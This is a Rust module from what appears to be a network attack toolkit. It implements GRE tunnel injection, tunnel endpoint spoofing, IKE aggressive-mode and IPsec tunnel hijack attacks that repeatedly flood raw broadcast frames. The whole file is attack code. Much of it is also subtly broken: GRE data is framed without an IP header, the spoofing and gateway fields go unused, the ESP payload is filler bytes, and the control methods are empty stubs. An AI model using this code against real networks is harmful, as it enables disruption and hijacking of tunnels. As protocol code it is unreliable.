//! GRE/Tunnel Attack Implementations
use super::packet::{GrePacket, IkePacket};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct GreTunnelInjectionAttack {
    pub tunnel_key: Option<u32>,
    pub encapsulated_payload: Vec<u8>,
}

impl Default for GreTunnelInjectionAttack {
    fn default() -> Self {
        Self::new()
    }
}

impl GreTunnelInjectionAttack {
    pub fn new() -> Self {
        Self {
            tunnel_key: None,
            encapsulated_payload: vec![],
        }
    }
    pub fn build_gre_packet(&self) -> GrePacket {
        let mut pkt = GrePacket::new(0x0800); // IPv4
        if let Some(key) = self.tunnel_key {
            pkt = pkt.with_key(key);
        }
        pkt.payload = self.encapsulated_payload.clone();
        pkt
    }
}

#[derive(Debug, Clone)]
pub struct TunnelEndpointSpoofingAttack {
    pub spoofed_endpoint: Ipv4Addr,
    pub target_endpoint: Ipv4Addr,
}

impl TunnelEndpointSpoofingAttack {
    pub fn new(spoofed: Ipv4Addr, target: Ipv4Addr) -> Self {
        Self {
            spoofed_endpoint: spoofed,
            target_endpoint: target,
        }
    }
    pub fn build_packet(&self) -> GrePacket {
        GrePacket::new(0x0800)
    }
}

#[derive(Debug, Clone)]
pub struct IkeAggressiveAttack {
    pub target_gateway: Ipv4Addr,
}

impl IkeAggressiveAttack {
    pub fn new(gateway: Ipv4Addr) -> Self {
        Self {
            target_gateway: gateway,
        }
    }
    pub fn build_ike_aggressive(&self) -> IkePacket {
        IkePacket::aggressive_mode()
    }
}

#[derive(Debug, Clone)]
pub struct IpsecTunnelHijackAttack {
    pub spi: u32,
    pub sequence: u32,
}

impl IpsecTunnelHijackAttack {
    pub fn new(spi: u32) -> Self {
        Self { spi, sequence: 1 }
    }
}

#[async_trait]
impl Attack for GreTunnelInjectionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let gre_packet = self.build_gre_packet();
            let gre_bytes = gre_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, gre_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending GRE tunnel injection packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "GRE Tunnel Injection"
    }
}

#[async_trait]
impl Attack for TunnelEndpointSpoofingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(150);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let gre_packet = self.build_packet();
            let gre_bytes = gre_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, gre_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending tunnel endpoint spoofing packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Tunnel Endpoint Spoofing"
    }
}

#[async_trait]
impl Attack for IkeAggressiveAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(200);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let ike_packet = self.build_ike_aggressive();
            let ike_bytes = ike_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, ike_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending IKE aggressive mode packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IKE Aggressive Mode"
    }
}

#[async_trait]
impl Attack for IpsecTunnelHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // IPsec ESP packet simulation (simplified)
            let esp_payload = vec![0xAB; 128];

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, esp_payload);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending IPsec tunnel hijack packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IPsec Tunnel Hijacking"
    }
}
